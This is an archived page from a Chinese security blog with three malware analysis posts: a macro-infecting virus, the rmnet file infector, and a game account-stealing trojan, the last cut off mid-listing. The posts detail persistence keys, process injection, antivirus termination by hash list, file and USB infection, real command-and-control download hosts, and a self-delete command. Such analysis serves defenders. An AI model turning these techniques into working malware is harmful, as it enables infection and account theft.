<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>idhyt&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="水中月.镜中花.浮华一片苍凉..">
<meta property="og:type" content="website">
<meta property="og:title" content="idhyt's blog">
<meta property="og:url" content="http://blog.idhyt.com/page/7/index.html">
<meta property="og:site_name" content="idhyt's blog">
<meta property="og:description" content="水中月.镜中花.浮华一片苍凉..">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="idhyt's blog">
<meta name="twitter:description" content="水中月.镜中花.浮华一片苍凉..">
  
    <link rel="alternate" href="/atom.xml" title="idhyt&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">idhyt&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">云淡风轻</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜尋"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.idhyt.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-virus-infected-word" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/29/virus-infected-word/" class="article-date">
  <time datetime="2013-11-29T03:11:11.000Z" itemprop="datePublished">2013-11-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/29/virus-infected-word/">病毒分析-宏感染型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>感染型宏病毒行为分析</p>
<h2 id="病毒简介">病毒简介</h2><p>病毒运行后会拷贝自身到system32目录下并提升权限注入其他进程，之后创建大量线程用于终止杀软，远程下载，感染系统正常文件。<br>1 释放自身到system32目录下，注入其他进程<br>2 终止杀软<br>3 远程下载文件不执行<br>4 添加自启动，打开word和excel宏功能<br>5 加密自身感染.doc和.xls文件<br>6 遍历系统盘，U盘，网络资源进行感染，包括.exe，.doc和.xls，删除系统备份文件.gho<br>7 隐藏进程自身</p>
<h2 id="运行过程">运行过程</h2><p>1.获取%system32%目录生成路径system32\blackice.exe 和system32\kernel.dll.<br>2.创建互斥体 blackicemutex，如果互斥体存在，则表明病毒已运行，退出.<br>3.提升进程权限SeDebugPrivilege.<br>4.%System32%目录下查找blackice.exe和kernel.dll，找不到则拷贝自身到该目录下并重命名为blackice.exe和kernel.dll，设置系统时间，设置文件属性为只读，隐藏，系统文件.<br>5.查找进程是否存在explorer.exe和taskmgr.exe，如果存在将自身注入该进程并运行.<br>6.创建大量线程实现其功能.</p>
<h3 id="线程1_sub_401160_结束杀软">线程1 sub_401160 结束杀软</h3><p>1.枚举当前进程获取进程名，如果找到杀软进程，则调用TerminateThread将其结束<br>2.如果结束杀软失败，则获取该杀软进程模块基址，在该进程中依次申请0x1000字节并写入0xCC，从0x1000开始到0x80000000<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infected-word-1.png" alt=""></p>
<h3 id="线程2_sub_4075F0_获取系统信息远程下载">线程2 sub_4075F0 获取系统信息远程下载</h3><p>1.从URL:<a href="http://fmtwld.zj.com/blackice3/url.txt下载配置文件到system32目录下的blackice.ini" target="_blank" rel="external">http://fmtwld.zj.com/blackice3/url.txt下载配置文件到system32目录下的blackice.ini</a><br>2.如果下载失败则延时1分钟从URL: <a href="http://fmtwld.vicp.net/blackice3/url.txt继续下载" target="_blank" rel="external">http://fmtwld.vicp.net/blackice3/url.txt继续下载</a><br>3.下载成功后从配置文件读取control节url字段（远程服务器地址）的数据并删除下载的配置文件<br>4.获取的系统信息（mac地址，端口，版本等）生成新的url发送给服务器<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infected-word-2.png" alt=""><br>5.从远程服务器下载新的配置文件读取url节区的string字段，并删除<br>6.如果该字段数据不为“notdown” 则从该字段获取文件名，从远程服务器下载该文件到system32目录下并调用Winexec执行，最后删除下载的配置文件<br>7.如果该字段数据为“notdown”则不进行下载文件</p>
<h3 id="线程3_sub_4082F0_自启动">线程3 sub_4082F0  自启动</h3><p>1.从系统配置文件win.ini中获取节区windows下key=run的值，如果不存在，则将该值写入c:\WINDOWS\system32\blackice.exe<br>2.获取system32目录下配置文件system.ini中boot节区下key=shell的值，如果该文件不存在，则创建该文件并写入boot节区，key=shell的值为”Explorer.exe  C:\WINDOWS\system32\blackice.exe”<br>3.检测C:\WINDOWS\system32\目录下是否存在blackice.exe和kernel.dll，如果不存在则拷贝自身为该文件</p>
<h3 id="线程4_sub_406900_感染-doc和-xls文件">线程4 sub_406900 感染.doc和.xls文件</h3><p>1.将自身map到内存<br>2.调用函数CLSIDFromProgID获取Excel.Application标识符获取其version（11.0）和quit<br>3.将注册表HKEY_CURRENT_USER\ software\microsoft\office \11.0（version）\word\security\子键level和AccessVBOM的键值置1，启动宏功能<br>4.将注册表HKEY_CURRENT_USER\ software\microsoft\excel\11.0（version）\office \security\子键level和AccessVBOM的键值置1，启动宏功能<br>5.释放子体book1.xls和Normal.dot文件<br>5.1 申请内存，写入自身加密写入<br>5.2 获取Excel.Application的StartupPath值即Excel的启动路径C:\Documents and Settings\Admin\Application Data\Microsoft\Excel\XLSTART\<br>5.3 检测该路径下是否存在book1.xls文件，如果存在则判断lines处字节是否为&lt;!!blackice&gt;，如果是的话则说明已经感染过则不进行感染<br>5.4 如果不存在book1.xls或者该文件lines处字节不为&lt;!!blackice&gt;则获取Add和SaveAs接口创建book1.xls文件<br>5.5 调用InsertLines属性将内存中生成的感染数据插入，最后调用save和quit属性保存并退出<br>6.用相同的方法，获取word的启动路径，生成包含加密数据的Normal.dot文件。<br>7.通过该方法，当用户打开任意word文档或者xls文档即可运行病毒</p>
<h3 id="线程5_sub_408210_感染U盘">线程5 sub_408210 感染U盘</h3><p>1.在可移动磁盘中创建AUTORUN.INF文件<br>2.写入AutoRun节区，key = open值为blackice.exe达到自动自动运行blackice.exe的目的，并设置该文件为只读隐藏系统文件<br>3.查找可移动磁盘中是否存在blackice.exe文件，如果不存在则将自身拷贝过去并重命名blackice.exe，设置为只读隐藏系统文件<br>4.遍历进程文件目录下的所有文件，如果后缀为.doc和.xls，则执行线程4中释放book1.xls和Normal.dot过程<br>5.如果是exe则将感染数据写入其资源文件<br>5.1 先将exe文件map到内存，然后将感染数据插入其资源文件<br>5.2 将感染过的exe文件map到内存，检测PE头，检测其资源数据开头是否为&lt;!!blackice&gt;，5.3 如果是的话说明写入过感染数据，则添加新节区并设置节区属性为0xE0000020u（可执行属性），将该节区指向感染数据。<br>5.4 如果不是的话说明没有写入感染数据，不添加节区操作。<br>6.如果是.gho(系统备份)则删除该文件<br>7.注册一个watchusb窗口循环接受消息和派遣消息监控U盘感染</p>
<h3 id="线程6_sub_406F80_感染系统磁盘和网络资源">线程6 sub_406F80 感染系统磁盘和网络资源</h3><p>1.枚举当前系统所有磁盘信息，如果为固定磁盘，则按照线程5的方式进行感染<br>2.枚举网络资源，并对网络资源上的数据进行感染<br>3.获取H盘，进行感染</p>
<h3 id="线程7_sub_4045F0_map自身到物理内存">线程7 sub_4045F0 map自身到物理内存</h3><p>1.将文件映射到物理内存<br>2.调用函数ZwOpenSection打开\Device\PhysicalMemory，如果打开失败，则修改其Acl重新打开获取其物理内存句柄<br>3.将物理内存map到当前进程中，获取其进程列表将自身进程加入其中，实现隐藏进程的目的</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/11/29/virus-infected-word/" data-id="civbwoo6a000x5p6ix2w9z2bp" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/11/29/virus-infected-word/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/感染/">感染</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-virus-infected-rmnet" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/25/virus-infected-rmnet/" class="article-date">
  <time datetime="2013-11-25T03:11:11.000Z" itemprop="datePublished">2013-11-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/25/virus-infected-rmnet/">病毒分析-rmnet感染型</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>感染型病毒rmnet简略行为分析</p>
<h2 id="调试环境">调试环境</h2><p>Windows xp sp3，Olldbg，010editor</p>
<h2 id="病毒简介">病毒简介</h2><p>该程序运行后，先自检测是否为C\Program Files\Microsoft\DesktopLayer.exe，然后后台创建ie进程并注入，最终遍历系统磁盘和可移动盘感染后缀为exe,dll,html,htm的文件，并感染可移动磁盘（U盘）。同时与远程服务器进行通信，下载程序并执行。<br>该病毒母体文件代码被混淆，无法用ida和od调试，通过行为监控得知其注入ie进程，因此将其注入代码从ie进程中dump出来进行分析。</p>
<h2 id="运行过程">运行过程</h2><h3 id="自检测">自检测</h3><p>检测自身是否在C\Program Files\Microsoft\DesktopLayer.exe，不是的话拷贝自身到该目录下重新运行</p>
<h3 id="绕过防火墙">绕过防火墙</h3><p>创建IEXPLORE.EXE进程，设置为后台运行，将自身注入到IE进程中运行，因此可以绕过本地防火墙与远程服务器进行通信。</p>
<h3 id="自启动">自启动</h3><p>创建线程Thread_1 设置自启动<br>获取注册表Software\Microsoft\Windows NT\CurrentVersion\Winlogon\userinit键值，判断自身是否在其键值中，不存在将自身写入该键值，设置开机自启动<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-1.png" alt=""></p>
<h3 id="远程下载数据">远程下载数据</h3><p>1.线程Thread_2 测试网络链接<br>不断访问google.com:80，bing.com:80，yahoo.com:80测试网络是否正常。<br>2.线程Thread_3 记录系统时间<br>循环写入系统时间，60秒循环一次，写入文件C:\Program Files\Internet Explorer\dmlconf.dat<br>3.线程Thread_4 与远程服务器连接，下载数据<br>与远程服务器443端口，域名为fget-career.com建立通信，不断从服务器下载文件并调用ShellexecuteA执行。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-2.png" alt=""></p>
<h3 id="Hook函数ZwWriteVirtualMemory">Hook函数ZwWriteVirtualMemory</h3><p>1.HOOK过程如下图所示<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-6.png" alt=""><br>2.之后通过函数FindFirstFileA查找文件C:\WINDOWS\system32\svchost.exe<br>3.调用CreateProcess函数创建过进程svchost.exe之后就会跳入HOOK代码中执行。</p>
<h3 id="执行HOOK代码，注入dll">执行HOOK代码，注入dll</h3><p>1.调用函数ZwQueryInformationProcess获取进程信息，+0x8处存放进程进程信息指针PVOID ProcessInformation。</p>
<pre><code>NTSTATUS WINAPI ZwQueryInformationProcess(
  <span class="number">__</span><span class="keyword">in</span>          HANDLE ProcessHandle,
  <span class="number">__</span><span class="keyword">in</span>          PROCESSINFOCLASS ProcessInformationClass,
  <span class="number">__</span><span class="keyword">out</span>         PVOID ProcessInformation,
  <span class="number">__</span><span class="keyword">in</span>          ULONG ProcessInformationLength,
  <span class="number">__</span><span class="keyword">out</span><span class="number">_</span>opt     PULONG ReturnLength
);
</code></pre><p>2.在ProcessInformation结构中+0x4处为PEB结构。</p>
<pre><code>typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1<span class="comment">;</span>
    PPEB PebBaseAddress<span class="comment">;</span>
    PVOID Reserved2[2]<span class="comment">;</span>
    ULONG_PTR UniqueProcessId<span class="comment">;</span>
    PVOID Reserved3<span class="comment">;</span>
} PROCESS_BASIC_INFORMATION<span class="comment">;</span>
</code></pre><p>3.PEB结构+0x8处存放着进程基址。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-7.png" alt=""></p>
<p>4.从0x10000000开始，循环在当前进程和目标进程（svchost.exe）申请相同的地址空间，每次增加0x1000，检测是否可用，直到0x30000000结束，得到相同的地址空间（0x20020000）。</p>
<p>5.之后将注入dll在本进程中申请的空间中（0x20020000）进行区段重定位，之后直接拷贝到目标进程相同的地址空间中（0x20020000）。这样注入目标进程运行后就不需要重定位了。</p>
<h3 id="自检测-1">自检测</h3><p>1.判断互斥体对象Global\SYSTEM_DEMETRA_MAIN是否存在，如果不存在则通过注册表找到IE路径打开IE。<br>2.恢复HOOK函数</p>
<h3 id="注入dll">注入dll</h3><p>1.通过CreateFileMappingA函数生成一个名字为Global\SYSTEM_DEMETRA_MAIN的文件映射对象<br>2.通过MapViewOfFile() 将0x7C00大小的dll文件映射到当前进程。<br>3.之后将该dll文件注入到svchost进程中，过程同0x3和0x4。<br>4.等待10秒之后调用UnmapViewOfFile释放映射对象。</p>
<h2 id="注入的两个DLL文件">注入的两个DLL文件</h2><p>405825.DLL和410A25.dll</p>
<h3 id="远控">远控</h3><p>1.判断进程目录下是否存在complete.dat文件<br>2.获取固定盘卷序列号，系统版本号，平台等信息<br>3.在进程同目录下创建dmlconf.dat文件，通过GetSystemTimeAsFileTime获取系统文件时间写入文件中。<br>4.创建线程0x10008E60实现自启动。<br>创建一个死循环，1秒循环次，在注册表Software\Microsoft\WindowsNT\CurrentVersion<br>\Winlogon的Userinit键值项里数值数据C:\WINDOWS\system32\userinit.exe,后边增加新键值c:\program files\microsoft\desktoplayer.exe，无限循环。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-8.png" alt=""><br>Userinit.exe是Windows操作系统一个关键进程。用于管理不同的启动顺序。<br>5.创建线程10008858检测网络<br>5.1创建非阻塞模式的socket<br>5.2通过函数Connect不断访问链接google.com:80<br>5.3通过select函数监视网页能否被访问。<br>6.创建线程10008A51记录系统文件时间<br>创建一个死循环，1分钟循环1次，在进程同目录的dmlconf.dat文件中写入系统文件时间。<br>7.线程1000687B和10008B3F实现远程截屏，关机等操作<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-9.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-10.png" alt=""></p>
<h3 id="感染磁盘">感染磁盘</h3><h4 id="感染pe文件">感染pe文件</h4><p>线程Thread_5 感染磁盘文件，遍历系统磁盘和可移动盘，对盘符下的所有exe，dll，html，htm文件进行感染。感染之前先判断磁盘剩余空间，磁盘剩余空间大于0x80000才进行感染。<br>遍历磁盘和可移动盘，感染Exe和dll：先检测是否存在节区.rmnet，如果存在表明感染过，不进行感染。如果不存在，在最后一个节中增加增加新节.rmnet，设置块属性为0xE0000020即可写代码段，并将入口指向该节区。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-3.png" alt=""></p>
<h4 id="感染html文件">感染html文件</h4><p>遍历磁盘和可移动盘，感染Html和Htm文件：先读取文件最后9个字节，看是否为，如果是的话表明感染过，不进行感染。如果不是则进行感染，将携带病毒自身数据的VB脚本文件写入文件最后。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-4.png" alt=""><br>一旦打开Html文件，该脚本会释放一个svchost.exe（写入的病毒自身）运行并对计算机进行感染。</p>
<h4 id="感染可移动磁盘">感染可移动磁盘</h4><p>线程Thread_6 感染可移动磁盘，在可移动盘创建autorun.inf文件，获取其大小，如果大于3则读取其中前3个字节，如果是RmN，则表明感染过，不进行感染。<br>如果不存在，同目录下创建RECYCLER\ S-1-5-21-1454471165-515967899-682003330-1003文件目录，属性设置为只读，隐藏，在该目录下生成YBakjuc.exe文件，写入数据（病毒自身）。<br>在autorun.inf文件中写入数据，插如U盘自动运行病毒文件YBakjuc.exe。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-5.png" alt=""></p>
<h3 id="HOOK">HOOK</h3><p>1.创建线程StartAddress,HOOK函数ZwResumeThread 和 ExitProcess。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-11.png" alt=""><br>2.创建线程0x10006606进入HOOK代码。循环判断是否存在互斥体Global\SYSTEM_DEMETRA_SHUTDOWN，如果存在恢复HOOK函数。<br>3.HOOK代码通过 OpenFileMappingA函数生成一个名字为Global\SYSTEM_DEMETRA_LIST的文件映射对象，之后将该文件注入到除自己所有的进程当中。注入方式和母体相同。<br>4.创建互斥对象Global\SYSTEM_DEMETRA_CONTROL。创建成功则创建线程0x10004523。<br>5.线程0x10004523每5秒循环一次通过Process32First和Process32Next枚举所有进程，将dll注入到除自己所有的进程中。注入方式同母体相同。<br>6.通过CreateRemoteThread函数创建远程线程在其他进程中运行。<br>7.HOOK网络传输函数<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-infection-rmnet-12.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/11/25/virus-infected-rmnet/" data-id="civbwoo6j00155p6idqrecwd8" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/11/25/virus-infected-rmnet/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/感染/">感染</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-virus-troj-simple" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/20/virus-troj-simple/" class="article-date">
  <time datetime="2013-11-20T03:11:11.000Z" itemprop="datePublished">2013-11-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/20/virus-troj-simple/">病毒分析-简单盗号木马</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一个简单的盗号木马简略分析</p>
<h2 id="调试环境">调试环境</h2><p>Windows xp sp3，Olldbg，010editor</p>
<h2 id="病毒简介">病毒简介</h2><p>病毒运行后会生成进91C7DF6D.cfg和91C7DF6D.dll两个文件，用作盗取用户数据发送到指定的URL地址。该过程会终止杀软进程，修改注册表信息自动运行，最后自删除。</p>
<h2 id="主要功能模块流程图">主要功能模块流程图</h2><p><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-steal-s1-1.png" alt=""></p>
<h2 id="运行过程">运行过程</h2><h3 id="创建线程,进入线程执行,获取开机运行时间">创建线程,进入线程执行,获取开机运行时间</h3><p>病毒如果伪装成conime.exe，ctfmon.exe，explorer.exe中任何一个进程运行，则从C:\WINDOWS\system32\dllcache找到该进程并启动[^autorun]。</p>
<h3 id="创建91C7DF6D-cfg文件并写入数据">创建91C7DF6D.cfg文件并写入数据</h3><p>1.生成路径 C:\WINDOWS\system32\91C7DF6D.cfg 返回长度0x20<br>2.创建91C7DF6D.cfg文件。<br>3.从病毒文件偏移0x5A08处读取0x5c字节的数据，并格式化为”%02X”格式即0xB8字节将0xB8字节数据后边加上”\r\n\r\n”写入91C7DF6D.cfg文件中。</p>
<h3 id="创建91C7DF6D-dll文件并写入数据">创建91C7DF6D.dll文件并写入数据</h3><p>1.生成路径 C:\WINDOWS\system32\91C7DF6D.dll 返回长度0x20<br>2.创建91C7DF6D.dll文件。<br>3.从病毒文件偏移0x2204处读取0x3800字节数据写入91C7DF6D.dll文件中<br> 从病毒文件偏移0x5A08处读取0x60字节数据写入91C7DF6D.dll文件中</p>
<h3 id="写入注册表设置自启动">写入注册表设置自启动</h3><p>将91C7DF6D-AEF5-4136-9252-AF030D7A5931 添加到注册表  Software\microsoft\windows\currentversion\Explorer\shellexecutehooks\下随系统Explorer.exe启动。</p>
<h3 id="查找game-exe进程并终止它">查找game.exe进程并终止它</h3><p>1.将系统进程枚举，之后进行MD5加密计算。<br>2.将计算值与game.exe进程MD5值AF9C0104867ED2841389167E775B8332比较，如果相同则终止它</p>
<h3 id="删除verclsid-exe，创建注册表">删除verclsid.exe，创建注册表</h3><p>1.查找文件 C:\WINDOWS\system32\VErCLSiD.exe ，如果找到删除，防止自创建CLSID时verclsid.exe认证。<br>2.在HKEY_CLASSES_ROOT下创建注册表新子项：CLsID{91C7DF6D-AEF5-4136-9252-AF030D7A5931}\InprocServer32，值为91C7DF6D.dll和ThreadingModel<br>在Software\microsoft\windows\currentversion\Explorer\shellexecutehooks创建注册表{91C7DF6D-AEF5-4136-9252-AF030D7A5931}值为Apartment<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-steal-s1-2.png" alt=""></p>
<h3 id="注册表操作，设置为自启动">注册表操作，设置为自启动</h3><p>1.打开注册表SOFTWARE{9184057B-D51B-4C2A-B779-EB4F548E9FDA}，如果该注册表不存在，则退出<br>2.如果该注册表存在，则枚举注册表下的所有子项并删除。<br>3.在注册表目录HKEY_LOCAL_MACHINE创建新子项SOFTWARE{9184057B-D51B-4C2A-B779-EB4F548E9FDA}<br>4.将当前进程设置为SeBackupPrivilege权限（备份注册表），删除liv<em>.tmp文件<br>5.将注册表Software\microsoft\windows\currentversion\Explorer所有项及子项备份到临时文件liv</em>.tmp文件中。<br>6.将当前进程设置为SeRestorePrivilege权限（还原注册表），从liv<em>.tmp临时文件中恢复注册表信息。<br>7.打开注册表ShellExecuteHooks\SOFTWARE{9184057B-D51B-4C2A-B779-EB4F548E9FDA}设置值的名称为｛91C7DF6D-AEF5-4136-9252-AF030D7A5931}<br>8.调用函数RegFlushKey将修改信息写入磁盘<br>9.删除临时文件liv</em>.tmp，重复一次操作确保修改注册表成功。</p>
<h3 id="加载91C7DF6D-dll运行s200函数">加载91C7DF6D.dll运行s200函数</h3><p>1.调用函数RegQueryValueExA查看注册表Software\microsoft\windows\currentversion\Explorer\shellexecutehooks{91C7DF6D-AEF5-4136-9252-AF030D7A5931}是否存在。<br>2.如果存在，则加载91C7DF6D.dll（功能见0xD）运行s200函数(功能见0xE)。<br>3.如果不存在，重复步骤0x6中的创建注册表操作</p>
<h3 id="自保护">自保护</h3><p>获取系统运行时间与0x61CC6C3(大约28.5分钟)，如果小于等于,重复设置自启动操作，总共重复三次，每次延时1s</p>
<h3 id="退出线程自删除">退出线程自删除</h3><p>1.获取病毒文件本身段路径。<br>2.调用函数GetEnvironmentVariab获得cme.exe路径<br>3.调用函数ShellExecuteA以cmd命令方式删除自身。<br>cmd.exe /c del C:\DOCUME~1\Admin...\S1.exe &gt;&gt; NUL</p>
<h3 id="91C7DF6D-dll函数功能：">91C7DF6D.dll函数功能：</h3><h4 id="结束杀软程序">结束杀软程序</h4><p>1.获取当前进程名<br>2.将进程MD5运算，然后与下列MD5值比较，如果找到就将该进程结束掉</p>
<pre><code><span class="number">5</span>AC71A9F4372CA7377C7E0C543FBFFFA safeboxtray<span class="class">.exe</span>
<span class="number">04</span>D1C083134C2EBECA57A9724B0855D4 <span class="number">360</span>tray<span class="class">.exe</span>
AE33A1F2459A12A09EC75D71D14B5E89 <span class="number">360s</span>afebox<span class="class">.exe</span>
<span class="number">3</span>ABD7CD8928FE1F3EB563F43B913CA4B <span class="number">360s</span>afe<span class="class">.exe</span>
B9E9786EAC82378D3A6E05FCC1E15D2C smartup<span class="class">.exe</span>
D7DB952BB0FA044F2B9A22FEADB37973 tqat.<span class="function"><span class="title">exe</span><span class="params">(网游安全模块)</span></span>
<span class="number">1</span>C085B8E02B137AA4EAFBE38CCF3D199
</code></pre><h4 id="判断是否为explorer-exe进程">判断是否为explorer.exe进程</h4><p>1.获取进程名MD5值与explorer.exe进程MD5值CDE09BCDF5FDE1E2EAC52C0F93362B79比较 。<br>2.如果是explorer.exe进程，调用s200函数。（功能见0xE）<br>3.如果不是explorer.exe进程，创建两个对象，一个0x5c大小(假设名字为Obj5C)，一个0x13f8大小，并进行初始化。<br>4.其中0x5c大小的对象Obj5C用作后边两个线程参数传入。该对象第一个DWORD值为函数导出表结构（0x100061dc）  第二个DWORD值为0x13f8大小的对象指针，0x18，0x24，0x30处为删除对象操作函数的指针。</p>
<pre><code><span class="number">003</span>D26B0  FC <span class="number">61</span> <span class="number">00</span> <span class="number">10</span> D8 <span class="number">38</span> <span class="number">3</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  黙.?=.........
<span class="number">003</span>D26C0  FF FF FF FF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">5</span>C <span class="number">62</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  灋灋....\b.....
<span class="number">003</span>D26D0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">5</span>C <span class="number">62</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....\b.........
<span class="number">003</span>D26E0  <span class="number">44</span> <span class="number">62</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  Db.............
<span class="number">003</span>D26F0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">32</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ...........<span class="number">.2</span>...
<span class="number">003</span>D2700  <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D F0 AD BA <span class="number">0</span>D F0 AD BA
</code></pre><h4 id="判断是否为game-exe进程">判断是否为game.exe进程</h4><p>1.计算进程MD5值并与game.exe进程的MD5值AF9C0104867ED2841389167E775B8332 进行比较。<br>2.如果是game.exe进程，则获取game.exe的目录，判断game.exe目录下是否存在fmod.dll文件。<br>3.如果存在fmod.dll文件，创建两个线程0x10002199和0x100021d9，两个线程的参数入参为之前生成的结构体struct。线程功能见0xE。</p>
<h4 id="注册表操作,设置为自启动项">注册表操作,设置为自启动项</h4><p>该过程同母体相同。</p>
<h3 id="S200函数功能">S200函数功能</h3><p>s200函数创建了两个线程：0x10003D94和0x10003DCF</p>
<h4 id="线程0x10003D94功能：删除托盘图标">线程0x10003D94功能：删除托盘图标</h4><p>1.通过FindWindowEx函数找到“ToolbarWindow32”托盘窗口句柄<br>2.通过函数 GetWindowThreadProcessId 获取该句柄创建者的进程explorer.exe<br>3.通过SendMessageA获取托盘数量<br>4.遍历托盘所有窗口的MD5值是否与158D0696DC5BCD4BADEE730DEA7613D8相等，如果相等就删除托盘图标。</p>
<h4 id="线程0x10003DCF功能：设置钩子监视消息队列">线程0x10003DCF功能：设置钩子监视消息队列</h4><p>1.获取进程的MD5值，验证进程MD5值是否为explorer.exe进程的MD5值CDE09BCDF5FDE1E2EAC52C0F93362B79<br>2.通过SetWindowsHookExA函数设置键盘钩子，监视消息队列。<br>3.设置死循环不断重复监视注册表是否设置为自启动，不过不存在就创建自启动，过程与0x8相同，2秒循环一次。</p>
<h3 id="game-exe下创建的两个线程功能">game.exe下创建的两个线程功能</h3><h4 id="线程0x10002199功能：设置HOOK函数，盗取用户数据">线程0x10002199功能：设置HOOK函数，盗取用户数据</h4><p>1.创建9个对象，每个对象为一个hook函数，大小为0x1D8，并进行初始化。<br>2.对象的结构如下所示(标注了几个重要的数据)：</p>
<pre><code>Object(
    <span class="number">0x00</span>：<span class="number">0x10006248</span>  <span class="comment">//删除对象函数指针</span>
    <span class="number">0x01</span>：********   <span class="comment">//0x100074B4处读取的数据</span>
    ...
    ...
    <span class="number">0x84</span>：<span class="number">0x100037E3</span> <span class="comment">//hook地址</span>
    <span class="number">0x88</span>：<span class="number">0x8B0000</span>  <span class="comment">//申请的堆块地址，存放着将要查找的特征值</span>
    <span class="number">0x8c</span>：<span class="number">0x8C0000</span>  <span class="comment">//申请的堆块地址，存放着将要查找的特征值</span>
    ...
    <span class="number">0x9c</span>：<span class="number">0x8</span> <span class="comment">//特征值的字节数</span>
    ...
    <span class="number">0xB0</span>: <span class="number">1</span>   <span class="comment">//对象操作成功置1，否则为0</span>
    ...
    <span class="number">0x1BC</span>：<span class="number">0x400000</span>  <span class="comment">//当前进程模块基址，即game.exe进程基址</span>
    ...
